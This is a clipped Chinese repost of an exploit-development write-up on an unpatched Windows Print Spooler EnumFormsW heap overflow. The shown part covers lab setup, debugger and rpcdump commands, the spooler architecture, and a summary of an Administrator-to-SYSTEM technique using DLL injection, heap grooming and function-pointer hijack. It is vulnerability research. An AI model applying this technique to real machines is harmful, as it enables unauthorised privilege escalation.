---
title: 【微信】RE 学习——Print Spooler 缺失边界检查
source: https://mp.weixin.qq.com/s/YXGU0EC-bUyWHQwhNixPog
source_host: mp.weixin.qq.com
clip_date: 2026-10-31T08:59:28+08:00
trace_id: 22399d92-ec13-4cb5-8703-3b9b18bf1b52
content_hash: 9667118437558b135d5f1361aa9cbb7baa0697de00c91d0120697c1eec45de38
status: synced
tags:
  - 微信
  - Windows逆向
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: TL;DR：Windows 打印后台服务 spoolsv.exe 的 EnumFormsW 路径缺失边界检查，作者通过 DLL 注入配合 16 字节精确堆溢写，实现从 Administrator 提权到 SYSTEM 且进程不崩，微软 MSRC 以需管理员权限为由拒不修复。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 40a75244-d011-8117-8a79-d859aa7c7052
ioc:
  cves:
    - CVE-2021-1675
    - CVE-2021-34527
    - CVE-2026-69309
    - CVE-2026-69344
    - CVE-2026-69346
    - CVE-2026-69364
    - CVE-2026-69552
    - CVE-2026-69569
    - CVE-2026-69838
    - CVE-2026-69921
    - CVE-2026-70564
    - CVE-2026-85877
  cwes:
    - CWE-122
    - CWE-20
    - CWE-787
  hashes:
    - 48e7f394dc3b3fcb2d72fcafaa33824f
    - 5c64b7211cbb6badd47abf6aeed196e932a9dc0f8381151f01d04d78eaf245df
    - 86db35c00d466d467b8b4d096593fc21bee398ae7f6dc747aad444b2ca72da94
    - 9bd943aaf6925609de67127d3ecff02996816b8aef0004f22925aa78ca47c1a5
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：Windows 打印后台服务 spoolsv.exe 的 EnumFormsW 路径缺失边界检查，作者通过 DLL 注入配合 16 字节精确堆溢写，实现从 Administrator 提权到 SYSTEM 且进程不崩，微软 MSRC 以需管理员权限为由拒不修复。
> 
> - **漏洞根因：** spoolss!EnumFormsW → InternalEnumForms → CopyIniFormToFormInfo → PackStrings → memcpy 这条链上，服务端以 `pForm + cbBuf` 推算字符串区起点，却从不验证该起点是否落在调用方真实分配的缓冲区内，属 CWE-122 堆溢出。
> 
> - **利用前提：** 需向 SYSTEM 进程 spoolsv.exe 注入 DLL，因此要求 High-IL 管理员 token 加 SeDebugPrivilege（普通用户 token 无此权限，OpenProcess 直接返回 ERROR_ACCESS_DENIED），故仅限 Admin→SYSTEM 提权。
> 
> - **远程不可达：** MS-RPRN 的 NDR 编组把 pForm 数组与 cbBuf 绑死，传输字节数受 cbBuf 约束，无法“声明 2GB、实传 64KB”，超大缓冲会在 NDR stub 阶段被 RPC_X_BAD_STUB_DATA 拒绝。
> 
> - **利用精度：** spray 0x2780 字节 SPRAY_OBJ 后每 4 块打洞，用 `cbBuf = needed + (delta - custom_off)` 让打包字符串精确跳过 16 字节 VS chunk 头，覆写相邻对象首字段的 NULL 函数指针；地址含 NULL 宽字符时用 `mov rax, imm64; jmp rax` trampoline 绕过。
> 
> - **验证与现状：** 2026 年 3 月上报后 MSRC 关闭工单；10 月复测主流版（10.0.26200.8655）与 Canary（10.0.29634.1000）仍可利用且全程 spoolsv 存活；Canary 版已出现整数溢出保护等新检查但未封死路径。

**赛博生存指南** *2026年10月31日 08:28*

> 原文：https://exploitreversing.com/wp-content/uploads/2026/10/exploit_reversing_11.pdf  
> 作者：Alexandre Borges（Blackstorm Security，Exploiting Reversing 系列第 11 篇）  
> 发布时间：客公告 2026-10-27  
> 翻译模型：GLM-5.3

**编者按：** Exploiting Reversing 系列第 11 篇，战场从内核换到用户态：Windows 打印后台服务 spoolsv.exe 的表单枚举路径 EnumFormsW 缺了一处边界检查。作者 2026 年 3 月把漏洞报给微软，MSRC 以“PoC 需要管理员权限”为由认定不达标、关闭了工单；到 10 月写下本文时，主流和 Canary 渠道的 Windows 上依旧能复现。利用前提是 Administrator + SeDebugPrivilege（要把 DLL 注入 spoolsv 才能让 pForm 和 cbBuf 两个参数解耦），收益是进程内执行从 admin 直达 SYSTEM——而且全程进程不崩：堆 spray 挖坑、16 字节精确覆写邻块回调指针、trampoline 跳 shellcode，收尾时 spoolsv 还活着。文末给出两个 exploit 变体的完整源码，一个落盘 EXPLOITED.txt 做证明，另一个直接在交互桌面弹出 SYSTEM 的 cmd。groom、corrupt、control、execute 四阶段讲得很细，值得当成 Windows 用户态堆溢出的教学样本来读。

## 00\. 开场白

“你正被监视着。政府有一套秘密系统——一台机器，每一天的每个小时都在盯着你。我知道，因为它是我造的。”

——Harold Finch（由出色的 Michael Emerson 饰演）｜《疑犯追踪》（Person of Interest），2011–2016

## 01\. 引言

欢迎来到 Exploiting Reversing（ER）系列第十一篇——一套在 Windows、iOS、hypervisor 等平台上逐步展开的漏洞利用开发与漏洞研究系列。本系列最近的几篇文章在这里：

主要来源：

-   全部文章更新：https://www.blackstormsecurity.com/research/
    

次要来源：

-   ERS_10：https://exploitreversing.com/2026/10/06/exploiting-reversing-er-series-article-10/
    
-   ERS_09：https://exploitreversing.com/2026/04/28/exploiting-reversing-er-series-article-09/
    
-   ERS_08：https://exploitreversing.com/2026/03/31/exploiting-reversing-er-series-article-08/
    
-   ERS_07：https://exploitreversing.com/2026/03/04/exploiting-reversing-er-series-article-07/
    
-   ERS_06：https://exploitreversing.com/2026/02/11/exploiting-reversing-er-series-article-06/
    
-   ERS_05：https://exploitreversing.com/2025/03/12/exploiting-reversing-er-series-article-05/
    
-   ERS_04：https://exploitreversing.com/2025/02/04/exploiting-reversing-er-series-article-04/
    
-   ERS_03：https://exploitreversing.com/2025/01/22/exploiting-reversing-er-series-article-03/
    
-   ERS_02：https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/
    
-   ERS_01：https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/
    

本文分析并利用的是一个 Windows 11 上尚未修复的漏洞——微软不认为它有多紧迫。因此，至少在我写下这些文字的时候，这个漏洞仍存在于当前更新过的 Windows 版本中，正好是研究 exploit 开发的好素材。这次的目标是一个用户态漏洞，普通用户没法直接触发，exploit 在本地运行，把权限从 Administrator 提升到 SYSTEM，而且不会造成严重后果。我决定写这篇文章，正是因为这个 bug 简单、有趣，值得一讲。

## 02\. 致谢

都 2026 年了，详细讲漏洞研究和真实 exploit 开发的文档依然少得可怜。我的直观感受是：信息共享的时代已经结束了。如今每周都有不少新文章，但绝大多数只展示最终结果，不解释从头到尾的完整过程，这对同行在漏洞利用研究上走出自己的路没什么帮助。遗憾的是，展示 exploit 开发手艺的意愿，已经被金钱等因素消磨掉了。

几年前我开始写恶意软件分析、漏洞研究和漏洞利用的文章时，心里有个明确的决定：应该毫无保留地分享信息——毕竟这样做并不妨碍我提升技术、发展职业。不出所料，时间始终是定期写作的最大限制，但我仍在努力为其他从业者积累有价值的基础资料。老读者都知道，没有 Ilfak Guilfanov（@ilfak）和 Hex-Rays SA（@HexRaysSA）多年来的全力支持，这些文章不可能发表。最后想说，研究工作正处在一个 AI 的新时代，但没有什么能替代我们的头脑——它能生成无限的知识，解决那些乍看之下不可能解决的问题。

人生苦短，但每一刻都值得，因为人才是这个世界上最好的东西。享受旅程，keep exploiting！

## 03\. 实验环境

本文所有步骤都在用户态完成，不需要内核调试环境，实验室搭建因此简化了不少。这项研究跨两台角色不同的机器，把它们分清楚对正确解读每个结果至关重要。

-   一台 Windows 11 Pro，OS build 10.0.26200（26H2），补丁全打，是做静态分析的主力机——IDA Pro 逆向、反编译、编写注入器和 payload 都在这里。根因分析所依据的 spooler 主流版二进制也来自这台机器：
    

```yaml
Product:     Microsoft Windows 11 Pro

OS build:    10.0.26300 (26H2), mainstream -- analysis only

Platform:    x64

Component:   spoolsv.exe    v10.0.26100.7689   (Print Spooler service, runs as SYSTEM)
SHA-256:     86DB35C00D466D467B8B4D096593FC21BEE398AE7F6DC747AAD444B2CA72DA94

Router:      spoolss.dll    v10.0.26100.7920
SHA-256:     5C64B7211CBB6BADD47ABF6AEED196E932A9DC0F8381151F01D04D78EAF245DF

Provider:    localspl.dll   v10.0.26100.7689

Client lib:  winspool.drv   (loaded in the CALLER's process, not in spoolsv)
```

-   两台目标虚拟机，分别对应两个服务渠道（Canary 和主流版），所有动态操作都在这里进行，本文的部分结果也产自这里。此外，帮助在主流生产版和 Canary 版上双双提权到 SYSTEM 的那个 16 字节 primitive，在两台机器上都存在且完全一致：
    

```yaml
Target A | mainstream/production  (hostname WIN11R2, 192.168.0.3):

  OS build:    10.0.26200.8655 (25H2)
  Platform:    x64
  Component:   spoolsv.exe    v10.0.26100.8875   SHA-256 8C1705AE...D420
  Router:      spoolss.dll    v10.0.26100.8521   SHA-256 37A74357...4D6C
  Provider:    localspl.dll   v10.0.26100.8875   SHA-256 CA4A0686...92FD


Target B | Canary channel  (hostname WININSIDER, 192.168.0.5):

  OS build:    10.0.29634.1000
  Platform:    x64
  Component:   spoolsv.exe    v10.0.29634.1000   SHA-256 06F3359A…FAED
  Router:      spoolss.dll    v10.0.29634.1000   SHA-256 B9FE27D5…E560
  Provider:    localspl.dll   v10.0.29634.1000   SHA-256 9B39BFD0…9494
```

-   顺带说清上面两台目标机的情况：它们不是最新版本，而是我最初测试这个漏洞时用的版本（当时就能打通）。此后从这些版本一直到当前主流 Windows 11 26H2（10.0.26300）和 Canary 10.0.29683.1000，实弹利用全部有效。
    
-   要检查根因、做 binary diffing 和逆向分析，也可以通过 Winbindex（https://winbindex.m417z.com/）把 Canary 版的 spoolss.dll / localspl.dll 拉到工作站上，不必费力安装精确版本的 Windows——那太耗时间了。
    
-   IDA Pro 或 IDA Home（@HexRaysSA）：https://hex-rays.com/ida-pro/
    
-   Visual Studio 2022，勾选“使用 C++ 的桌面开发”组件外加 Windows SDK，用来编译注入器和 payload：
    

-   Visual Studio：https://visualstudio.microsoft.com/downloads/
    
-   Windows SDK：https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/
    

-   WinDbg：https://aka.ms/windbg/download，或执行 `winget install Microsoft.WinDbg`
    
-   Malwoverview：https://github.com/alexandreborges/malwoverview｜安装：\`python -m pip install malwoverview\[all\]\`
    
-   （可选）BinDiff，以及可选的 Diaphora，用于补丁分析：
    

-   BinDiff：https://github.com/google/bindiff/releases
    
-   Diaphora：https://github.com/joxeankoret/diaphora
    

## 04\. 漏洞背景

这次我不选典型的内核组件，而是分析一个用户态目标——它完全可以和驱动一样有意思。这个组件就是 Windows Print Spooler，对应服务进程 spoolsv.exe：以 SYSTEM 身份运行、承载一个 RPC 接口、加载一小撮 provider 模块，安全案底又长又显赫——PrintNightmare 只是最出名的那个，但绝非唯一。执行下面的命令就能拉出一份 CVE 清单：

```yaml
$ malwoverview --nist 4 --NIST "Windows Print Spooler" --ncves 10

[1] CVE ID: CVE-2026-85877
    Status: Analyzed
    Published: 2026-09-08T18:21:13.960
    Last Modified: 2026-09-09T20:15:28.947
    CVSS v3.1: 8.8 (N/A)
    Description:
    Heap-based buffer overflow in Windows Print Spooler Components allows
    an unauthorized attacker to execute code over a network.

[2] CVE ID: CVE-2026-70564
    Status: Analyzed
    Published: 2026-09-08T18:20:08.937
    Last Modified: 2026-09-24T23:18:40.050
    CVSS v3.1: 7.8 (N/A)
    Description:
    Heap-based buffer overflow in Windows Print Spooler Components allows
    an authorized attacker to elevate privileges locally.

[3] CVE ID: CVE-2026-69921
    Status: Analyzed
    Published: 2026-09-08T18:20:02.587
    Last Modified: 2026-09-16T19:07:13.210
    CVSS v3.1: 7.8 (N/A)
    Description:
    Heap-based buffer overflow in Windows Print Spooler Components allows
    an authorized attacker to elevate privileges locally.

[4] CVE ID: CVE-2026-69838
    Status: Analyzed
    Published: 2026-09-08T18:19:55.330
    Last Modified: 2026-09-24T23:18:32.350
    CVSS v3.1: 7.0 (N/A)
    Description:
    Use after free in Windows Print Spooler Components allows an authorized
    attacker to elevate privileges locally.
...
...
```

拿类似清单还有另一种方式，推荐执行：

```sql
$ malwoverview --nist 6 --NIST "Windows Print Spooler" --ncves 10

CVE             Vendor     Published   CVSS        Description
-------------------------------------------------------------------------------------------------
CVE-2026-85877  microsoft  2026-09-08  8.8 HIGH    Heap-based buffer overflow in Windows Print...
CVE-2026-70564  microsoft  2026-09-08  7.8 HIGH    Heap-based buffer overflow in Windows Print...
CVE-2026-69921  microsoft  2026-09-08  7.8 HIGH    Heap-based buffer overflow in Windows Print...
CVE-2026-69838  microsoft  2026-09-08  7.0 HIGH    Use after free in Windows Print Spooler Comp...
CVE-2026-69569  microsoft  2026-09-08  5.7 MEDIUM  Untrusted pointer dereference in Windows Pri...
CVE-2026-69552  microsoft  2026-09-08  5.7 MEDIUM  Generation of error message containing sensi...
CVE-2026-69364  microsoft  2026-09-08  7.1 HIGH    Concurrent execution using shared resource w...
CVE-2026-69346  microsoft  2026-09-08  8.0 HIGH    Heap-based buffer overflow in Windows Print...
CVE-2026-69344  microsoft  2026-09-08  5.5 MEDIUM  Out-of-bounds read in Windows Print Spooler...
CVE-2026-69309  microsoft  2026-09-08  7.0 HIGH    Double free in Windows Print Spooler Compone...
-------------------------------------------------------------------------------------------------

[+] The 10 most recent of 101 CVE(s) found for Windows Print Spooler, ordered by CVE ID. Use
    --ncves <number> for more, --ncves 0 for all of them,
    --time <years> to bound them by year, or --sort-by-published to order them by publication date.

[+] Descriptions are truncated to fit the table. Use --nist 2 --NIST <CVE> for the full text of any
    row.
[+] This is a keyword search over CVE descriptions. NVD has no file-level mapping, so a match means
    the text mentions the component, not that this build is affected.
```

回到正题。这个 bug 是一个堆缓冲区溢出（CWE-122），这次出在 spooler 的表单枚举路径上。根因是 spoolss!EnumFormsW 子程序里缺了两处输入校验——一次由不当输入验证引发的越界写，属于常见漏洞类别。真实影响自然不是拒绝服务，而是以 SYSTEM 身份执行任意代码（服务本来就以 SYSTEM 运行），即完整的本地提权。整个利用过程中进程连崩都不崩：最终 exploit 先 groom 堆布局，精确覆写它想要的字节，劫持一个函数指针，跑完 payload，spoolsv.exe 依然安然无恙。有趣的是（也许并不意外），我用一个典型的 16 字节 primitive，在主流生产版和更新的 Canary 版上都完成了从 Administrator 到 SYSTEM 的提权，最后弹出一个 SYSTEM 权限的终端。

众所周知，我通常不会把和 exploit 相关的漏洞提交给“玩家们”，但这个漏洞只涉及 Administrator 到 SYSTEM（不是普通用户到 SYSTEM），所以这次我提交给了微软（2026 年 3 月 28 日），对方的回复如下：

> “当前，MSRC 优先处理评估为 Important 或 Critical 严重等级的漏洞以立即修复。运行该 PoC 需要管理员权限。未提供证明域用户也能触达此代码的远程 PoC。经仔细调查，本案例被评估为不构成漏洞，未达到 MSRC 立即修复的标准（MSRC's bar for immediate service）。感谢您与我们合作保护客户的安全。本案例现已关闭。”

我不觉得这是什么问题，绝对没有怨气——规则就是规则，我从不与这类决定争论。我也已通知微软：不久之后我会发布一篇文章，发布时会再次告知他们。既然 MSRC 不把它当漏洞（说实话我也不当），那它反而是这个系列里用来演示、讲解利用技术的好素材。总之，这仍是一个未修复的提权漏洞，存在于多个 Windows 版本（主流和 Canary）中，在当前版本上工作得完美无缺。一方面它只是个把 Administrator 提到 SYSTEM 的简单 exploit；另一方面，它仍然是读者学习研究的好例子。

提权是本地、进程内的操作，通过向 spoolsv 注入 DLL 完成，需要 admin + SeDebug 权限。我最近一次测试在 2026 年 10 月 10 日，bug 还在，exploit 还能跑。

我还快速（只试了一次）对一个 Windows Server 2025（10.0.26100.33438）做了首次远程测试：配了正确的 RPC 客户端，目标机上挂着实时调试器。初步验证表明，这个溢出无法经 RPC 触达。看起来是 RPC worker 在服务端加了 level 校验和调用方授权检查，而 MS-RPRN（Microsoft Print System Remote Protocol）传输层会把服务端的缓冲区绑定到正确的字节数上——远程调用方无法提交比声明更大的缓冲区，任何超大缓冲区的调用都会在带漏洞的 worker 运行前被服务端的 NDR（Network Data Representation）stub 拒绝（返回 RPC_X_BAD_STUB_DATA）。当然，读者应该自己再验证一下，毕竟如我所说，我只试了一次。

回到所需的初始条件：本地的 PoC 向 spoolsv.exe 注入 DLL。向 SYSTEM 进程注入 DLL 需要一个提升过的（High-IL）管理员 token，且 token 里要带 SeDebugPrivilege（无论启用与否，有就行），这一点必须讲精确。很容易产生错觉，以为 SeDebugPrivilege 至今仍默认分配给 Administrators 组。在 UAC 之下，它会被从普通中完整性（medium-integrity）管理员 token 中过滤掉，只出现在提升后的 token 里；而且即便在那里，它默认也是禁用状态，必须先通过 AdjustTokenPrivileges 函数启用，才能调用 OpenProcess。

不出所料，我直接用内置 Administrator 运行来绕过提权这道坎：它的 token 是 High-IL（High Integrity Level），SeDebugPrivilege 天然在场（只是未启用）。注入前可在每台机器上跑 `whoami /priv` 确认现有权限。因此必须说清楚（这一点非常重要）：PoC 不是未授权用户能跑的——向 SYSTEM spooler 注入 DLL 需要 SeDebugPrivilege，普通用户的 token 里没有它。

这个事实在主流和 Canary 两台虚拟机上都验证过：普通账户（非管理员）持有 Medium-IL token、不带 SeDebugPrivilege（只有 SeShutdown、SeChangeNotify、SeTimeZone 等），因此无法以写内存和创建线程的方式打开 spoolsv，注入器还没动手就被拒之门外（调用 OpenProcess 函数返回 ERROR_ACCESS_DENIED）。

另一方面，检查漏洞代码路径本身倒不需要 Administrator——EnumForms 函数是普通的、无特权的打印例程，走 spooler 的 RPC 端点就能到达；这里的注入只是替客户端补上“客户端不会远程暴露的那个 RPC 端点”而已。

## 05\. 实验环境配置要点

本文的调查建立在 spoolsv.exe 的内部细节之上（它以 SYSTEM 运行），采集调试信息有两条路。其一，以非侵入（non-invasive）模式挂 WinDbg（ `windbg -pn spoolsv.exe` ）；为免后续出岔子，建议先确认挂对了进程（ `Get-Process spoolsv | Select-Object Id, ProcessName, Path` ）。补充或替代方案是用 `windbg -I` 把 WinDbg 配成 AeDebug 调试器——一旦 spoolsv 因未处理异常而崩溃，调试器会直接停在出错指令处，上下文和调用栈都保得住。当然，从那里继续执行的话，服务会被重启。

和每次 Windows 研究一样，工作站（宿主机）和目标虚拟机都应配好公共符号：

-   `_NT_SYMBOL_PATH=srv*c:\symbols*https://msdl.microsoft.com/download/symbols`

针对这个目标和漏洞，微软为整个 spooler 栈提供了符号——spoolsv.exe、spoolss.dll、localspl.dll 都能解析出 EnumFormsW、SplEnumForms、InternalEnumForms、CopyIniFormToFormInfo 以及名为 PackStrings 的内部函数。读者后面会看到，我的调查直接或间接用到了这些函数。

概念和工具方面，本文涉及的漏洞类别是堆溢出，因此检查堆内容相关的对象就很重要，尤其是 spoolsv.exe 进程的用户态堆——它是 Segment Heap——以及其中的 Variable-Size（VS）堆，即本次涉及 chunk 所在的那片内存。

复现过程中，WinDbg 挂上 spoolsv.exe 后有若干命令会派上用场：

```
!heap -s                             列出各堆及其后端
!heap                                堆摘要
dt ntdll!_SEGMENT_HEAP <addr>        Segment Heap 控制结构
dt ntdll!_HEAP_VS_CONTEXT ...        VS 分配器上下文
dt ntdll!_HEAP_VS_CHUNK_HEADER <chunk>   我们要覆写的 16 字节 VS chunk 头
```

我们要打交道的就是以 \_HEAP_VS_CHUNK_HEADER 结构表示的 chunk——直接对应“砸烂下一个 chunk 的 16 字节 VS 头（元数据）再顺势写它自己的数据”这一步。

确认目标上运行的模块和版本有两种非侵入方式：

```
PS C:\> Get-Process | grep -i spoolsv

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------   -----      -----      ------     --  -- -----------
   469      20     5084      14432       0.78   13852   0 spoolsv

PS C:\> cdb -pv -p 13852

Microsoft (R) Windows Debugger Version 10.0.22621.1 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

*** wait with pending attach
.......
.......
Loading unloaded module list
......
(361c.2cac): Wake debugger - code 80000007 (first chance)
ntdll!NtWaitForSingleObject+0x14:
00007ff8`74978ec4 c3              ret

0:000> lm vm localspl

start             end                 module name
00007ff8`48250000 00007ff8`483b7000   localspl   (deferred)
    Image path: C:\WINDOWS\System32\localspl.dll
    Image name: localspl.dll
    Image was built with /Brepro flag.
    Timestamp:        312CF9A4 (This is a reproducible build file hash, not a timestamp)
    CheckSum:         001692A6
    ImageSize:        00167000
    File version:     10.0.29683.1000
    Product version:  10.0.29683.1000
    File flags:       0 (Mask 3F)
    File OS:          40004 NT Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0409.04b0
    Information from resource tables:
        CompanyName:      Microsoft Corporation
        ProductName:      Microsoft® Windows® Operating System
        InternalName:     localspl.dll
        OriginalFilename: localspl.dll
        ProductVersion:   10.0.29683.1000
        FileVersion:      10.0.29683.1000 (WinBuild.160101.0800)
        FileDescription:  Local Spooler DLL
        LegalCopyright:   © Microsoft Corporation. All rights reserved.

0:000> qd
```

第二种是直接把 DLL 当转储加载：

```
PS C:\> cdb -z C:\Windows\System32\localspl.dll

Microsoft (R) Windows Debugger Version 10.0.22621.1 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

Loading Dump File [C:\Windows\System32\localspl.dll]

************* Path validation summary **************
Response                         Time (ms)     Location
Deferred                                        srv*c:\symbols*https://msdl.microsoft.com/download/symbols
Symbol search path is: srv*c:\symbols*https://msdl.microsoft.com/download/symbols

Executable search path is:
ModLoad: 00000001`80000000 00000001`80167000   C:\Windows\System32\localspl.dll

localspl!DllMainCRTStartup:
00000001`800462e0 48895c2408      mov     qword ptr [rsp+8],rbx
ss:00000000`00000008=????????????????

0:000> lm vm localspl

start             end                 module name
00000001`80000000 00000001`80167000   localspl   (pdb symbols)
    c:\symbols\localspl.pdb\9A59C0EDCFA2BE66D4045C1B1DFCE7DE1\localspl.pdb
    Loaded symbol image file: localspl.dll
    Mapped memory image file: C:\Windows\System32\localspl.dll
    Image path: C:\Windows\System32\localspl.dll
    Image name: localspl.dll
    Image was built with /Brepro flag.
    Timestamp:        312CF9A4 (This is a reproducible build file hash, not a timestamp)
    CheckSum:         001692A6
    ImageSize:        00167000
    File version:     10.0.29683.1000
....
....
0:000> qd
```

## 06\. 基础知识：Windows Print Spooler 架构

这个漏洞直接或间接涉及四个文件：

-   **winspool.drv**
    
    ：客户端 API 库，加载进任何调用打印 API 的进程地址空间，但不属于 spooler 服务。它的职责是把 EnumForms 这类调用编组成 RPC 请求发给 spooler。
    
-   **spoolsv.exe**
    
    ：Print Spooler 服务进程，以 SYSTEM 运行，充当 RPC 服务端——绑定 MS-RPRN 接口、接收客户端请求。
    
-   **spoolss.dll**
    
    ：spooler 的路由器（router），加载在 spoolsv.exe 进程内。打印请求不会直接发往设备，而是被路由（重定向）到负责目标打印机的那家 provider。这个重定向器（一种路由组件）的入口以 EnumFormsW 函数导出。
    
-   **localspl.dll**
    
    ：本地打印 provider，同样运行在 spoolsv.exe 内。真正认识本机打印机、驱动、端口和表单的正是这个模块。因此，一旦 spoolss.dll 判断请求是本地的，干实际活儿（包括那次会溢出的内存拷贝）的必然是 localspl.dll。
    

场景里还有其他 provider：

-   **win32spl.dll**
    
    ：把请求重定向到远程打印服务器。
    
-   **inetpp.dll**
    
    ：处理 Internet 打印。不过就我们的 bug 而言，与调用方缓冲区交互的是本地 provider。
    

服务端的三个模块（spoolss、spoolsv、localspl）共享同一个 spoolsv.exe 地址空间和一个进程默认堆——这就是为什么 localspl 里发生的溢出可以经 groom 精准落到我们控制的对象上（至少本地如此）。

为了让读者有更清晰的脉络，可以把整个利用场景想象成：

-   攻击者进程（admin + SeDebug）：winspool.drv（客户端），在这里 level 会被检查。它经 RPC 与 spoolsv.exe 服务通信。
    
-   spoolsv.exe（SYSTEM）：地址空间里有三样东西：
    

-   spoolss.dll：重定向器（router）。
    
-   localspl.dll：provider，OOB 发生的地方（经 memcpy 函数）。
    
-   进程自己的堆（Segment Heap）：共享、可 groom。
    

bug（OOB）位于 InternalEnumForms → CopyIniFormToFormInfo → PackStrings → memcpy 这条链上。既然主角是表单（form），了解它的定义会有帮助。在 Windows 打印模型里，form 是具名的纸张（A4、Letter、Legal 等纸张格式）定义，尺寸以毫米的千分之一为单位。

spooler 允许调用方添加自己的“用户”表单：内置表单标记为 FORM_BUILTIN，用户表单标记为 FORM_USER；后者由本地 provider 持久化，跨会话存续，直到被删除。基于这些最基本的概念：枚举表单返回一个变长 blob，由固定大小记录组成的数组加上名字字符串构成，总大小取决于表单数量和名字长度。为了让这种布局成为可能，EnumForms 函数用了一套尺寸协商协议和一个字符串打包例程——而溢出滥用 的恰恰就是这套机制。此外，调用方可以通过 AddForm 函数添加具名表单，这意味着攻击者可以精确控制“稍后被枚举拷贝的那个字符串”的每一个字节。

把“从调用方到字节拷贝”的表单枚举请求再展开一层（这条路正是 exploit 稍后走的路），链路如下：

-   调用方进程：winspool.drv 的 EnumFormsW 函数，编组参数并经 RPC 联系 spooler。
    
-   RPC 服务端 stub：RpcEnumForms
    
-   RPC worker：spoolsv!YEnumForms
    
-   本地 provider 入口：localspl!SplEnumForms
    
-   表单迭代：localspl!InternalEnumForms
    
-   结构填充：localspl!CopyIniFormToFormInfo
    
-   字符串打包：spoolss!PackStrings / spoolsv!PackStrings
    
-   目标拷贝：ucrtbase!memcpy
    

EnumFormsW 函数有一层“分身”结构——它同时出现在三个模块（winspool.drv、spoolss.dll、spoolsv.exe）里，各自干各自的活。

另一个关键点：目前住在 winspool.drv 里的安全检查只保护“经过这个二进制的调用方”，而经其他任何路径到达 RpcEnumForms 函数的请求都享受不到这层保护。因此，一个经 `\\pipe\spoolss` 进来的远程系统、ncalrpc 端点上的本地进程、甚至 spoolsv 内部直接调 spoolss!EnumFormW 的代码，都不碰 winspool.drv，请求自然没人校验。

Print System Remote Protocol（MS-RPRN）是 spooler 暴露的 RPC 接口。细讲之前，先定义三个相关术语（其中两个前文提过）：

-   **RPC（Remote Procedure Call）**
    
    ：让调用方像调本地函数一样调用运行在另一个进程（甚至另一台机器）里的函数的机制。便利之处在于调用端和被调端都由同一份接口定义生成。
    
-   **Marshalling（编组）**
    
    ：把函数参数打包成字节流以便网络传输的操作；对端解包的操作叫 unmarshalling。打包格式用的是 NDR（Network Data Representation）。与 Java、.NET、PHP 等技术类似，大多数 bug 出在 unmarshalling 阶段。
    
-   **Opnum（operation number，操作编号）**
    
    ：RPC 接口里每个函数的固定索引。线上请求会携带 opnum，服务端用它选择要执行的例程——本质上是分派表（dispatch table）的数组下标。
    

按照微软的 Standard Assignments 文档（https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/848b8334-134a-4d02-aea4-03b673d6c515），该 RPC 接口的 UUID 是 12345678-1234-ABCD-EF00-0123456789AB。大致上，一个 RPC 接口就像一张函数表（也许用“方法”或“操作”更贴切），按索引编号，这个索引就是 opnum。客户端调用 RpcEnumForms 这样的 stub 函数（职责是枚举指定打印机支持的表单）时，RPC 运行时用 opcode 34 在服务端接口的分派表里查到它、调用对应的服务端例程、把 unmarshal 好的参数递过去。

通信大致是：

```
(client stub) RpcEnumForms | opnum = 34 → 数据编组 + 发送 → RPC →
(server) RPC runtime → dispatch table [opnum 34] → server routine（在这里做数据校验）
```

列出接口本身，可以用 impacket 工具集：

```
PS C:\> python -m pip install -U impacket

PS C:\> rpcdump.py 'Administrator:Hacker@127.0.0.1' | grep -A5 "Print System Remote Protocol"

Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
Bindings:
          ncalrpc:[LRPC-cbc97152ce6db84b6d]
```

输出说明该接口只经 ncalrpc（同机本地 RPC）可达。没有 `\pipe\spoolss` 的 ncacn_np 绑定，也没有 ncacn_ip_tcp 绑定，很遗憾不存在网络传输。事实上，系统得装上 Print Server 角色之后那些远程绑定才会出现。跑 rpcdump.py 的目的，就是在花时间做拷贝操作之前确认接口绑定了哪些传输。另外，后文会看到，相关的 opnum 有两个：

-   **Opnum 34｜RpcEnumForms 函数**
    
    ：枚举操作，拷贝就在这里溢出。
    
-   **Opnum 30｜RpcAddForm 函数**
    
    ：我们植入受控内容的途径。
    

RPC 接口只能通过服务端绑定的传输到达。历史上 spooler 连接命名管道 `\pipe\spoolss` （可经 SMB 从网络触达）和一个本地 ncalrpc 端点。说明一下：ncacn_np 是承载在命名管道上的 RPC，可经 SMB 远程触达；ncalrpc 是只留在本机、从不跨网络的传输。PrintNightmare 相关 exploit 发布后（https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527），微软加固了默认配置，\`\\pipe\\spoolss\` 默认不再对远程暴露。当然，可达不等于可利用。Windows 11 客户端只提供 ncalrpc 传输，管道是关的；如果装了带打印角色的 Windows Server， `\pipe\spoolss` 则是开的。

整个利用过程中你会注意到：spooler 几乎所有枚举操作都围绕同一套“两次调用”机制，bug 就藏在这里——接口契约被违反了。EnumFormsW 函数原型如下：

```cpp
BOOL EnumFormsW(
    HANDLE  hPrinter,     // handle from OpenPrinter
    DWORD   Level,        // 1 or 2
    LPBYTE  pForm,        // output buffer (caller-allocated)
    DWORD   cbBuf,        // size of that buffer, in BYTES
    LPDWORD pcbNeeded,    // out: bytes required
    LPDWORD pcReturned);  // out: number of forms written
```

和众多同类函数一样，它靠两次调用来确定 cbBuf 的准确值：

-   先以 `pForm = NULL` 、 `cbBuf = 0` 调用。调用失败，返回 ERROR_INSUFFICIENT_BUFFER（122），并把所需大小写进 pcbNeeded 参数。
    
-   按 pcbNeeded 给出的字节数精确分配。
    
-   带着这块缓冲再次调用， `cbBuf = *pcbNeeded` 。这次成功，缓冲区里填入 pcReturned 条记录。
    

一切看似正常，但魔鬼在细节里。cbBuf 参数本应描述 pForm 实际指向的缓冲区大小。于是服务端被允许相信：只要 cbBuf >= 所需大小，往 pForm 写所需字节就是安全的，绝不会出事。事实上，只要没人去开薛定谔猫的盒子，它看起来确实一切良好。

